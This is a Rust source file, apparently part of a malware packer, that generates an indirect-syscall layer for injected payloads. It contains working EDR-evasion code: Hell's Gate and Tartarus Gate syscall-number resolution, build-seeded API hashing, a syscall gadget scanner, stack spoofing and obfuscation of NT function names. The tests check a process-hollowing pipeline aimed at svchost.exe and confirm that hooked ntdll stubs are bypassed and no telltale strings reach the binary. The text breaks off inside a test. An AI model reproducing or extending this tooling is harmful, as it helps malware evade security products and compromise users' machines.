    pub fn nt_queue_apc(
        thread: HANDLE,
        routine: *const core::ffi::c_void,
        argument1: *mut core::ffi::c_void,
        _argument2: *mut core::ffi::c_void,
        _argument3: *mut core::ffi::c_void,
    ) -> i32 {
        let routine: ApcRoutineFn = unsafe { std::mem::transmute(routine) };
        let queued = unsafe { QueueUserAPC(Some(routine), thread, argument1 as usize) };
        if queued == 0 {
            let error = unsafe { GetLastError() };
            if error.0 == 0 {
                return STATUS_UNSUCCESSFUL;
            }
            return windows::core::HRESULT::from_win32(error.0).0;
        }
        STATUS_SUCCESS
    }
"#;

/// `nt_queue_apc`, mode indirect.
const QUEUE_APC_INDIRECT: &str = r#"    /// NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
    /// ApcArgument3).
    pub fn nt_queue_apc(
        thread: HANDLE,
        routine: *const core::ffi::c_void,
        argument1: *mut core::ffi::c_void,
        argument2: *mut core::ffi::c_void,
        argument3: *mut core::ffi::c_void,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                routine as usize,
                argument1 as usize,
                argument2 as usize,
                argument3 as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.queue_apc,
                *gadget,
            )
        }
    }
"#;

/// `nt_set_info_file`, mode none: the ntdll export resolved dynamically.
///
/// The Win32 equivalent (`SetFileInformationByHandle`) takes a different class
/// enumeration, so the native call is used verbatim in both modes.
const SET_INFO_FILE_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type SetInfoFileFn = unsafe extern "system" fn(
        HANDLE,
        *mut core::ffi::c_void,
        *const core::ffi::c_void,
        u32,
        i32,
    ) -> i32;

    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
    /// Length, FileInformationClass). None mode: resolve the export dynamically
    /// (windows-rs does not declare it) and call it.
    pub fn nt_set_info_file(
        file: HANDLE,
        io_status: *mut core::ffi::c_void,
        info: *const core::ffi::c_void,
        length: u32,
        class: i32,
    ) -> i32 {
        let address = resolve_nt_export(&$SET_INFO_FILE_FUNC_DEF$);
        if address == 0 {
            return STATUS_UNSUCCESSFUL;
        }
        let set_info: SetInfoFileFn = unsafe { std::mem::transmute(address) };
        unsafe { set_info(file, io_status, info, length, class) }
    }
"#;

/// `nt_set_info_file`, mode indirect.
const SET_INFO_FILE_INDIRECT: &str = r#"    /// NtSetInformationFile(FileHandle, &IoStatusBlock, FileInformation,
    /// Length, FileInformationClass).
    pub fn nt_set_info_file(
        file: HANDLE,
        io_status: *mut core::ffi::c_void,
        info: *const core::ffi::c_void,
        length: u32,
        class: i32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                file.0 as usize,
                io_status as usize,
                info as usize,
                length as usize,
                class as usize,
                0,
                0,
                0,
                0,
                0,
                0,
                ssns.set_info_file,
                *gadget,
            )
        }
    }
"#;

const NT_FUNCTIONS: &[NtFunction] = &[
    NtFunction {
        name: "NtAllocateVirtualMemory",
        table_field: "alloc_vm",
        helper_name: "nt_alloc_vm",
        helper_none: ALLOC_VM_NONE,
        helper_indirect: ALLOC_VM_INDIRECT,
    },
    NtFunction {
        name: "NtWriteVirtualMemory",
        table_field: "write_vm",
        helper_name: "nt_write_vm",
        helper_none: WRITE_VM_NONE,
        helper_indirect: WRITE_VM_INDIRECT,
    },
    NtFunction {
        name: "NtReadVirtualMemory",
        table_field: "read_vm",
        helper_name: "nt_read_vm",
        helper_none: READ_VM_NONE,
        helper_indirect: READ_VM_INDIRECT,
    },
    NtFunction {
        name: "NtResumeThread",
        table_field: "resume_thread",
        helper_name: "nt_resume_thread",
        helper_none: RESUME_THREAD_NONE,
        helper_indirect: RESUME_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtUnmapViewOfSection",
        table_field: "unmap_view",
        helper_name: "nt_unmap_view",
        helper_none: UNMAP_VIEW_NONE,
        helper_indirect: UNMAP_VIEW_INDIRECT,
    },
    NtFunction {
        name: "NtProtectVirtualMemory",
        table_field: "protect_vm",
        helper_name: "nt_protect_vm",
        helper_none: PROTECT_VM_NONE,
        helper_indirect: PROTECT_VM_INDIRECT,
    },
    NtFunction {
        name: "NtSuspendThread",
        table_field: "suspend_thread",
        helper_name: "nt_suspend_thread",
        helper_none: SUSPEND_THREAD_NONE,
        helper_indirect: SUSPEND_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtQueryInformationProcess",
        table_field: "query_info_process",
        helper_name: "nt_query_info_process",
        helper_none: QUERY_INFO_PROCESS_NONE,
        helper_indirect: QUERY_INFO_PROCESS_INDIRECT,
    },
    NtFunction {
        name: "NtGetContextThread",
        table_field: "get_context_thread",
        helper_name: "nt_get_context_thread",
        helper_none: GET_CONTEXT_THREAD_NONE,
        helper_indirect: GET_CONTEXT_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtSetContextThread",
        table_field: "set_context_thread",
        helper_name: "nt_set_context_thread",
        helper_none: SET_CONTEXT_THREAD_NONE,
        helper_indirect: SET_CONTEXT_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtCreateThreadEx",
        table_field: "create_thread_ex",
        helper_name: "nt_create_thread_ex",
        helper_none: CREATE_THREAD_EX_NONE,
        helper_indirect: CREATE_THREAD_EX_INDIRECT,
    },
    NtFunction {
        name: "NtWaitForSingleObject",
        table_field: "wait_for_single_object",
        helper_name: "nt_wait_for_single_object",
        helper_none: WAIT_FOR_SINGLE_OBJECT_NONE,
        helper_indirect: WAIT_FOR_SINGLE_OBJECT_INDIRECT,
    },
    NtFunction {
        name: "NtQueryInformationThread",
        table_field: "query_info_thread",
        helper_name: "nt_query_info_thread",
        helper_none: QUERY_INFO_THREAD_NONE,
        helper_indirect: QUERY_INFO_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtClose",
        table_field: "close",
        helper_name: "nt_close",
        helper_none: CLOSE_NONE,
        helper_indirect: CLOSE_INDIRECT,
    },
    NtFunction {
        name: "NtOpenProcess",
        table_field: "open_process",
        helper_name: "nt_open_process",
        helper_none: OPEN_PROCESS_NONE,
        helper_indirect: OPEN_PROCESS_INDIRECT,
    },
    NtFunction {
        name: "NtQueueApcThread",
        table_field: "queue_apc",
        helper_name: "nt_queue_apc",
        helper_none: QUEUE_APC_NONE,
        helper_indirect: QUEUE_APC_INDIRECT,
    },
    NtFunction {
        name: "NtSetInformationFile",
        table_field: "set_info_file",
        helper_name: "nt_set_info_file",
        helper_none: SET_INFO_FILE_NONE,
        helper_indirect: SET_INFO_FILE_INDIRECT,
    },
];

/// The Nt* function names the active techniques need, deduplicated and in the
/// canonical [`NT_FUNCTIONS`] order.
///
/// Techniques not in the pipeline contribute nothing, so their SSNs are never
/// resolved (and their names never emitted) — less work at startup and fewer
/// strings in the binary.
pub fn required(pipeline: &[RuntimeStep]) -> Vec<&'static str> {
    required_functions(pipeline)
        .into_iter()
        .map(|f| f.name)
        .collect()
}

/// The full [`NtFunction`] records the active techniques need.
fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
    required_functions_with(pipeline, &[])
}

/// The full [`NtFunction`] records the active techniques plus any extra `Nt*`
/// names need (e.g. the ones `build.stub.api_resolution` routes to).
fn required_functions_with(
    pipeline: &[RuntimeStep],
    extra_nt: &[&'static str],
) -> Vec<&'static NtFunction> {
    let mut needed: BTreeSet<&str> = BTreeSet::new();
    for step in pipeline {
        if let Some(def) = crate::techniques::find(step.name()) {
            needed.extend(def.syscalls.iter().copied());
        }
    }
    needed.extend(extra_nt.iter().copied());
    NT_FUNCTIONS
        .iter()
        .filter(|f| needed.contains(f.name))
        .collect()
}

/// Renders the `$SYSCALLS_BLOCK$` fragment for the given runtime.
///
/// - No active technique needs syscalls: a no-op `init_syscalls`.
/// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
/// - `mode: indirect`: the full syscall layer (SSN table, resolver — Hell's
///   Gate, Tartarus Gate or API hashing —, ASM trampoline, gadget scanner) plus
///   the helpers.
///
/// `extra_nt` pulls in the `Nt*` helpers the selected `build.stub.api_resolution`
/// proxies route to.
pub fn render_block_with(
    plan: &SyscallsConfig,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
    extra_nt: &[&'static str],
    seed: u64,
) -> String {
    let required = required_functions_with(pipeline, extra_nt);
    if required.is_empty() {
        return assemble(
            "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
            prelude::EMPTY_BODY,
            &["init_syscalls"],
        );
    }

    let (header, body) = match plan.mode {
        SyscallsMode::None => (
            "// --- Syscall layer (build.stub.syscalls.mode = none) ---\n// Direct Win32 calls: the \
             fragments always call the nt_* helpers, which map to\n// the Win32 APIs below. The \
             DLL/function names are rebuilt at runtime from\n// obfuscated bytes injected by the \
             packer."
                .to_string(),
            render_none(&required, strings),
        ),
        SyscallsMode::Indirect => {
            let resolver = plan.resolver.label();
            (
                format!(
                    "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = {resolver}) ---\n// \
                     Indirect syscalls with {resolver} SSN resolution. The Nt* names never\n// appear in \
                     the binary: Hell's/Tartarus Gate rebuild them at runtime from\n// obfuscated bytes, \
                     api_hash replaces them with precomputed FNV-1a hashes.\n// See docs/techniques/indirect_syscalls.md."
                ),
                render_indirect(plan, &required, strings, spoofing_block(pipeline, strings), seed),
            )
        }
    };

    let reexports: Vec<&str> = std::iter::once("init_syscalls")
        .chain(required.iter().map(|f| f.helper_name))
        .collect();
    assemble(&header, &body, &reexports)
}

/// Wraps the rendered body in `mod syscalls { ... }` and re-exports the
/// helpers the fragments call through `crate::`.
fn assemble(header: &str, body: &str, reexports: &[&str]) -> String {
    let mut block = format!("{header}\nmod syscalls {{\n{body}}}\n");
    block.push_str(&format!("use syscalls::{{{}}};\n", reexports.join(", ")));
    block
}

/// Renders the `mode: none` body: the prelude plus the direct helpers for the
/// required functions.
fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");
    let unmap_def = strings
        .obfuscate("NtUnmapViewOfSection")
        .render_stub_expr("unmap_func");
    let open_process_def = strings
        .obfuscate("NtOpenProcess")
        .render_stub_expr("open_process_func");
    let query_def = strings
        .obfuscate("NtQueryInformationProcess")
        .render_stub_expr("query_info_name");
    let get_context_def = strings
        .obfuscate("NtGetContextThread")
        .render_stub_expr("get_context_name");
    let set_context_def = strings
        .obfuscate("NtSetContextThread")
        .render_stub_expr("set_context_name");
    let query_thread_def = strings
        .obfuscate("NtQueryInformationThread")
        .render_stub_expr("query_thread_name");
    let set_info_file_def = strings
        .obfuscate("NtSetInformationFile")
        .render_stub_expr("set_info_file_name");

    let mut out = String::from(prelude::NONE_PRELUDE);
    for f in required {
        out.push_str(f.helper_none);
        out.push('\n');
    }
    out.replace("$NTDLL_DEF$", &ntdll_def)
        .replace("$UNMAP_FUNC_DEF$", &unmap_def)
        .replace("$OPEN_PROCESS_FUNC_DEF$", &open_process_def)
        .replace("$QUERY_FUNC_DEF$", &query_def)
        .replace("$GET_CONTEXT_FUNC_DEF$", &get_context_def)
        .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
        .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
        .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
}

/// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
/// initializers and the selected resolver's resolution lines) plus the indirect
/// helpers.
fn render_indirect(
    plan: &SyscallsConfig,
    required: &[&'static NtFunction],
    strings: &StringsConfig,
    spoofing: Option<String>,
    seed: u64,
) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");

    let mut fields = String::new();
    let mut init = String::new();
    let mut resolve_hg = String::new();
    let mut resolve_tg = String::new();
    let mut resolve_ah = String::new();
    let mut helpers = String::new();

    for f in required {
        fields.push_str(&format!("        {}: u32,\n", f.table_field));
        init.push_str(&format!("            {}: 0,\n", f.table_field));

        // The name is rebuilt at runtime from obfuscated bytes; the variable
        // name (e.g. `alloc_vm_name`) is not sensitive. The API-hashing
        // resolver skips it entirely and embeds a precomputed hash instead.
        let name_var = format!("{}_name", f.table_field);
        let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
        resolve_hg.push_str(&format!(
            "        table.{} = resolve_ssn_with_fallback(module, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_tg.push_str(&format!(
            "        table.{} = resolve_ssn(&file, &{})?;\n",
            f.table_field, name_def
        ));
        resolve_ah.push_str(&format!(
            "        table.{} = resolve_ssn(&file, 0x{:016x})?;\n",
            f.table_field,
            resolvers::api_hash::api_hash_with(f.name.as_bytes(), seed)
        ));

        helpers.push_str(f.helper_indirect);
        helpers.push('\n');
    }

    // `stack_spoofing` replaces the raw trampoline with its own `nt_invoke`,
    // so the technique's block is emitted once, below the helpers it drives (its
    // step module is skipped by the renderer).
    let spoofing = match spoofing {
        Some(block) => {
            helpers.push_str(&block);
            helpers.push('\n');
            true
        }
        None => false,
    };

    let resolve = match plan.resolver {
        Resolver::HellsGate => &resolve_hg,
        Resolver::TartarusGate => &resolve_tg,
        Resolver::ApiHash => &resolve_ah,
    };
    let resolver_body = resolvers::render_body(
        plan.resolver,
        init.trim_end(),
        resolve.trim_end(),
        &ntdll_def,
        seed,
    );

    let mut out = prelude::INDIRECT_PRELUDE
        .replace("$SSN_FIELDS$", fields.trim_end())
        .replace("$RESOLVER_BODY$", &resolver_body)
        .replace(
            "$SPOOFING_INIT$",
            if spoofing {
                "        init_stack_spoofing().map_err(|e| e.to_string())?;"
            } else {
                ""
            },
        )
        .replace(
            "$TRAMPOLINE_NAME$",
            if spoofing {
                "nt_invoke_raw"
            } else {
                "nt_invoke"
            },
        );
    out.push_str(&helpers);
    out
}

/// The rendered `stack_spoofing` block, when the runtime selects that technique.
///
/// `None` for every other runtime, which is what leaves the raw trampoline in
/// place under its usual `nt_invoke` name.
fn spoofing_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> Option<String> {
    pipeline
        .iter()
        .find(|step| step.name() == stack_spoofing::DEF.name)
        .map(|step| {
            step.technique
                .render_fragment(strings, PayloadFormat::Pe, None)
        })
}

/// Extracts the SSN from a Hell's Gate stub prologue.
///
/// Returns `Some(ssn)` when `bytes` starts with the canonical prologue
/// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`), and `None`
/// otherwise (hooked or otherwise altered stub). This mirrors the resolver
/// embedded in the generated stub, so the parsing behavior is unit-tested
/// here instead of on a live ntdll.
#[cfg(test)]
pub fn parse_ssn_prologue(bytes: &[u8]) -> Option<u32> {
    const PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8]; // mov r10, rcx; mov eax, imm32
    if bytes.len() < 8 || bytes[..4] != PROLOGUE {
        return None;
    }
    Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
}

/// Returns the offset of the first `syscall` followed by a return (`0F 05 C3`
/// or `0F 05 CB`) in `bytes`, if any. Mirrors the generated stub's gadget
/// scanner (`prelude::INDIRECT_PRELUDE`), so the matching behavior is
/// unit-tested here instead of on a live ntdll.
#[cfg(test)]
pub fn find_gadget_offset(bytes: &[u8]) -> Option<usize> {
    bytes
        .windows(3)
        .position(|w| w[0] == 0x0F && w[1] == 0x05 && (w[2] == 0xC3 || w[2] == 0xCB))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::process_hollowing::Params;
    use crate::techniques::TechniqueKind;

    /// The standard FNV basis, used as the test seed so the API-hashing hash
    /// constants match the pinned reference values.
    const TEST_SEED: u64 = 0xcbf2_9ce4_8422_2325;

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn hollowing_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
            params: Params {
                payload: None,
                target: r"C:\Windows\System32\svchost.exe".to_string(),
            },
        })]
    }

    fn sleep_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::new(TechniqueKind::SleepObfuscation {
            params: crate::techniques::sleep_obfuscation::Params::default(),
        })]
    }

    fn indirect() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::HellsGate,
        }
    }

    fn tartarus() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::TartarusGate,
        }
    }

    fn api_hash_config() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::ApiHash,
        }
    }

    // --- configuration ---

    #[test]
    fn from_yaml_defaults_to_none_when_absent() {
        let plan = SyscallsConfig::from_yaml(None).expect("defaults should be valid");
        assert_eq!(plan.mode, SyscallsMode::None);
        assert_eq!(plan.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_parses_indirect_mode() {
        let yaml = YamlSyscallsPlan {
            mode: "indirect".into(),
            resolver: "hells_gate".into(),
        };
        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("indirect should be valid");
        assert_eq!(plan.mode, SyscallsMode::Indirect);
        assert_eq!(plan.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_rejects_unknown_mode() {
        let yaml = YamlSyscallsPlan {
            mode: "direct".into(),
            resolver: "hells_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("direct should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.mode"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn from_yaml_parses_tartarus_gate() {
        let yaml = YamlSyscallsPlan {
            mode: "indirect".into(),
            resolver: "tartarus_gate".into(),
        };
        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("tartarus_gate should be valid");
        assert_eq!(plan.mode, SyscallsMode::Indirect);
        assert_eq!(plan.resolver, Resolver::TartarusGate);
    }

    #[test]
    fn from_yaml_parses_api_hash() {
        let yaml = YamlSyscallsPlan {
            mode: "indirect".into(),
            resolver: "api_hash".into(),
        };
        let plan = SyscallsConfig::from_yaml(Some(&yaml)).expect("api_hash should be valid");
        assert_eq!(plan.mode, SyscallsMode::Indirect);
        assert_eq!(plan.resolver, Resolver::ApiHash);
    }

    #[test]
    fn from_yaml_rejects_unknown_resolver() {
        let yaml = YamlSyscallsPlan {
            mode: "indirect".into(),
            resolver: "halos_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("halos_gate should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.resolver"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn yaml_block_defaults_to_none_and_hells_gate() {
        let yaml: YamlSyscallsPlan = serde_yml::from_str("mode: indirect\n").expect("parse");
        assert_eq!(yaml.mode, "indirect");
        assert_eq!(yaml.resolver, "hells_gate");
    }

    // --- required functions ---

    #[test]
    fn required_lists_hollowing_functions_in_canonical_order() {
        let required = required(&hollowing_pipeline());
        assert_eq!(
            required,
            vec![
                "NtAllocateVirtualMemory",
                "NtWriteVirtualMemory",
                "NtReadVirtualMemory",
                "NtResumeThread",
                "NtUnmapViewOfSection",
                "NtProtectVirtualMemory",
                "NtSuspendThread",
                "NtQueryInformationProcess",
                "NtGetContextThread",
                "NtSetContextThread",
                "NtCreateThreadEx",
                "NtWaitForSingleObject",
                "NtQueryInformationThread",
                "NtClose",
            ]
        );
    }

    #[test]
    fn required_is_empty_when_no_technique_uses_syscalls() {
        assert!(required(&sleep_pipeline()).is_empty());
        assert!(required(&[]).is_empty());
    }

    #[test]
    fn required_deduplicates_across_the_pipeline() {
        // Two hollowing steps would be invalid plan, but the union logic
        // must still deduplicate (defensive).
        let pipeline = hollowing_pipeline();
        let names: BTreeSet<&str> = required(&pipeline).into_iter().collect();
        assert_eq!(names.len(), 14, "no duplicates expected");
    }

    // --- Hell's Gate parsing (unit-tested reference for the stub) ---

    #[test]
    fn resolve_ssn_extracts_the_expected_ssn_from_a_canonical_prologue() {
        // `mov r10, rcx; mov eax, 0x2A`
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8, 0x2A, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&prologue), Some(42));
    }

    #[test]
    fn resolve_ssn_reports_pattern_mismatch_for_a_hooked_prologue() {
        // A hooked stub (e.g. `jmp` to an EDR trampoline) has no SSN.
        let hooked = [0x48, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(parse_ssn_prologue(&hooked), None);
    }

    #[test]
    fn resolve_ssn_reports_function_not_found_when_the_buffer_is_unreadable() {
        // Mirrors the stub: a failed lookup (GetProcAddress/read) is
        // FunctionNotFound, before any pattern check happens.
        let lookup = |_name: &str| None;
        let read = |_addr: usize| None;
        let err = resolve_ssn_reference(&lookup, &read, "NtResumeThread")
            .expect_err("a missing function must fail");
        assert_eq!(
            err,
            ReferenceError::FunctionNotFound("NtResumeThread".into())
        );
    }

    #[test]
    fn resolve_ssn_reads_the_ssn_through_the_injected_lookup() {
        let lookup = |_name: &str| Some(0x1000);
        let read = |_addr: usize| Some([0x4C, 0x8B, 0xD1, 0xB8, 0x07, 0x00, 0x00, 0x00]);
        let ssn = resolve_ssn_reference(&lookup, &read, "NtWriteVirtualMemory")
            .expect("a canonical prologue should resolve");
        assert_eq!(ssn, 7);
    }

    /// Host-side mirror of the stub's `resolve_ssn_with_fallback` decision:
    /// only a hooked live prologue falls back to the clean on-disk copy.
    fn resolve_ssn_with_fallback_reference(
        live: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
        file: &dyn Fn(&str) -> std::result::Result<u32, ReferenceError>,
        name: &str,
    ) -> std::result::Result<u32, ReferenceError> {
        match live(name) {
            Ok(ssn) => Ok(ssn),
            Err(ReferenceError::PatternMismatch(_)) => file(name),
            Err(other) => Err(other),
        }
    }

    #[test]
    fn hells_gate_falls_back_to_the_file_on_a_hooked_prologue() {
        let hooked = |_name: &str| Err(ReferenceError::PatternMismatch("NtX".into()));
        let clean = |_name: &str| Ok(9);
        assert_eq!(
            resolve_ssn_with_fallback_reference(&hooked, &clean, "NtX"),
            Ok(9)
        );

        // A missing live export is not a hook, so it does not fall back.
        let missing = |_name: &str| Err(ReferenceError::FunctionNotFound("NtX".into()));
        assert!(matches!(
            resolve_ssn_with_fallback_reference(&missing, &clean, "NtX"),
            Err(ReferenceError::FunctionNotFound(_))
        ));

        // A live success is never overridden by the file.
        let live = |_name: &str| Ok(11);
        assert_eq!(
            resolve_ssn_with_fallback_reference(&live, &clean, "NtX"),
            Ok(11)
        );
    }

    /// Reference error type for [`resolve_ssn_reference`], mirroring the
    /// stub's `SyscallError::FunctionNotFound` / `PatternMismatch` variants.
    #[derive(Debug, PartialEq, Eq)]
    enum ReferenceError {
        FunctionNotFound(String),
        PatternMismatch(String),
    }

    /// Host-side mirror of the stub's `resolve_ssn`, with the address lookup
    /// and the memory read injected so the resolution logic is testable
    /// without Windows. Keep in sync with the generated stub's resolver.
    fn resolve_ssn_reference(
        lookup: &dyn Fn(&str) -> Option<usize>,
        read: &dyn Fn(usize) -> Option<[u8; 8]>,
        name: &str,
    ) -> std::result::Result<u32, ReferenceError> {
        let address =
            lookup(name).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        let prologue =
            read(address).ok_or_else(|| ReferenceError::FunctionNotFound(name.to_string()))?;
        parse_ssn_prologue(&prologue)
            .ok_or_else(|| ReferenceError::PatternMismatch(name.to_string()))
    }

    // --- API hashing (unit-tested reference for the stub) ---

    #[test]
    fn api_hash_matches_fnv1a_reference_values() {
        // FNV-1a 64-bit with the canonical basis; the empty string returns the
        // basis untouched, and the first required NT function is pinned against
        // an independent reference computed outside the crate.
        let h = |name: &[u8]| {
            resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS)
        };
        assert_eq!(h(b""), 0xcbf2_9ce4_8422_2325);
        assert_eq!(h(b"NtAllocateVirtualMemory"), 0x4fe2_32be_2dca_3638);
        assert_eq!(h(b"NtGetContextThread"), 0x60b6_1d0a_f197_a950);
    }

    #[test]
    fn api_hash_is_deterministic() {
        let h = |name: &[u8]| {
            resolvers::api_hash::api_hash_with(name, resolvers::api_hash::OFFSET_BASIS)
        };
        assert_eq!(h(b"NtWriteVirtualMemory"), h(b"NtWriteVirtualMemory"));
        assert_ne!(h(b"NtWriteVirtualMemory"), h(b"NtReadVirtualMemory"));
    }

    #[test]
    fn api_hash_constants_are_build_seeded() {
        // The packer emits a per-build FNV basis (`API_HASH_SEED`), so the same
        // function hashes to a different constant in a different build — a
        // fixed basis would be a static signature.
        let one = render_block_with(
            &api_hash_config(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );
        let two = render_block_with(
            &api_hash_config(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED ^ 0xdead_beef,
        );
        let consts = |block: &str| -> Vec<String> {
            block
                .lines()
                .filter(|line| line.contains("resolve_ssn(&file, 0x"))
                .map(|line| line.trim().to_string())
                .collect()
        };
        assert!(
            one.contains("const API_HASH_SEED"),
            "the seed const is missing"
        );
        assert!(!consts(&one).is_empty(), "no hash constants emitted");
        assert_ne!(
            consts(&one),
            consts(&two),
            "the constants must vary by build"
        );
    }

    // --- gadget search (unit-tested reference for the stub) ---

    #[test]
    fn find_gadget_locates_the_syscall_ret_sequence() {
        let bytes = [0x90, 0x90, 0x0F, 0x05, 0xC3, 0xCC, 0xCC];
        assert_eq!(find_gadget_offset(&bytes), Some(2));
    }

    #[test]
    fn find_gadget_returns_none_when_the_sequence_is_absent() {
        let bytes = [0x0F, 0x05, 0xC2, 0x0F, 0x05, 0x90, 0xC3];
        assert_eq!(find_gadget_offset(&bytes), None);
    }

    #[test]
    fn find_gadget_returns_none_for_short_buffers() {
        assert_eq!(find_gadget_offset(&[]), None);
        assert_eq!(find_gadget_offset(&[0x0F, 0x05]), None);
    }

    #[test]
    fn find_gadget_accepts_a_retf_terminator() {
        // Some builds end the stub with `syscall; retf` (CB) instead of `ret`.
        let bytes = [0x90, 0x0F, 0x05, 0xCB, 0xCC];
        assert_eq!(find_gadget_offset(&bytes), Some(1));
    }

    #[test]
    fn syscall_diagnostics_are_keyword_free() {
        // The always-compiled `SyscallError` messages live in the prelude and
        // reach the binary; none may name a resolver or a hook. (The `tech_dbg!`
        // strings are inert unless `build.stub.debug` is set.)
        let prelude = crate::engine::syscalls::prelude::INDIRECT_PRELUDE;
        for keyword in ["hells_gate", "tartarus_gate", "api_hash", "hooked"] {
            assert!(
                !prelude.contains(keyword),
                "diagnostic prelude names '{keyword}'"
            );
        }
    }

    // --- rendered block (tests 6 and 7 of the phase spec) ---

    #[test]
    fn indirect_block_obfuscates_the_nt_names() {
        let block = render_block_with(
            &indirect(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );

        // The names must be reconstructed at runtime, never cleartext outside
        // comments (doc comments never reach the binary; the guardrail strips
        // them the same way).
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext NT names leaked outside comments: {leaked:?}"
        );
        // ... while the obfuscated definitions and the resolver exist.
        assert!(
            block.contains("table.alloc_vm = resolve_ssn"),
            "missing resolution line"
        );
        assert!(block.contains("crate::dec_xor"), "xor strategy not applied");
        assert!(
            block.contains("resolve_ssn_with_fallback(module, &"),
            "no resolution lines"
        );
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn indirect_block_contains_the_trampoline_and_ssn_table() {
        let block = render_block_with(
            &indirect(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("jmp r11"), "gadget jump missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(block.contains("pub fn nt_alloc_vm"), "helper missing");
        assert!(block.contains("fn init_syscalls"), "init missing");
    }

    #[test]
    fn tartarus_gate_block_reads_ssns_from_a_clean_file_copy() {
        let block = render_block_with(
            &tartarus(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );

        // The resolver walks a clean copy of ntdll read from disk, not the
        // live module's export stubs.
        assert!(block.contains("std::fs::read"), "clean-copy read missing");
        assert!(block.contains("fn export_rva"), "export walker missing");
        assert!(
            block.contains("resolve_ssn(&file, &"),
            "file-based resolution missing"
        );
        assert!(
            !block.contains("resolve_ssn(module, &"),
            "Hell's Gate resolution must not be emitted for Tartarus Gate"
        );
        // The shared machinery is still present.
        assert!(block.contains("global_asm"), "trampoline missing");
        assert!(block.contains("struct SsnTable"), "SSN table missing");
        assert!(block.contains("fn find_gadget"), "gadget scanner missing");
        assert!(!block.contains('$'), "leftover placeholders: {block}");
    }

    #[test]
    fn tartarus_gate_block_obfuscates_the_ntdll_path_and_names() {
        let block = render_block_with(
            &tartarus(),
            &hollowing_pipeline(),
            &xor_config(),
            &[],
            TEST_SEED,
        );
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext names/paths leaked outside comments: {leaked:?}"
        );
    }

    #[test]
